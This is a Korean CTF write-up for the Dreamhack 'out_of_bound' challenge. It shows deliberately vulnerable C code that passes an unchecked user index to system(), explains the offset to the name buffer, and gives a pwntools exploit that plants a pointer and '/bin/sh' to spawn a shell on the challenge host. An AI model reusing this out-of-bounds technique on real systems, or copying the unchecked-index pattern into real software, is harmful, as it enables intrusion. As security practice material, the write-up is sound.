## out_of_bound
---

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

<br><br>

## Solution
---

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

<br>

name에 ```/bin/sh```를 넣고 name과 command 변수 간의 오프셋은 76으로 4로 나누면 19다.

즉, command에서 76바이트 뒤에 name이 존재하며, 인덱스 값으로는 command[19]에 name이 위치한다.

따라서 문자열을 넣어주고 인덱스를 19로 해주면 될 줄 알았는데.. 실패했다.

<br>

질문을 보니 system 함수의 인자는 ```const char* str```로 받는다.

```const char*```이므로 포인터니까 인자의 주소를 참조하게 된다.

인자로 주어진 값은 ```command[idx]```이며, command 변수에 할당된 값을 확인해보면 인자의 값들이 모두 주소로 되있는 것을 확인할 수 있다.

<br>

![image](https://user-images.githubusercontent.com/52172169/186662208-1acbfd71-c206-49a8-bc53-03edc30a4859.png)

<br>

그래서 공격을 성공하기 위해서는 주소값을 줘야한다고 한다.

어떤 주소를 줘야 하는가에 대해서는 생각해보면 우리는 입력을 name에 하게 되고, 인덱스 값으로 19만큼 주면 name의 위치가 나오므로 name에 저장된 주소에 저장된 값을 참조하게 될 것이다.

따라서 name+4의 주소를 주고 인덱스 값을 19로 준다면, name에는 name+4의 주소가 저장되어 있으므로 name+4에 있는 값을 불러올 것이다.

그러므로 name+4에는 /bin/sh 문자열을 주면 최종적으로 system('/bin/sh')가 호출되어 셸을 흭득할 것이다.

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games',13710)

# name_addr = 0x0804a0ac # .bss

payload = p32(0x804a0b0) + b'/bin/sh'
p.sendafter(b'Admin name: ', payload)
p.sendafter(b'What do you want?: ', b'19')

p.interactive()
```
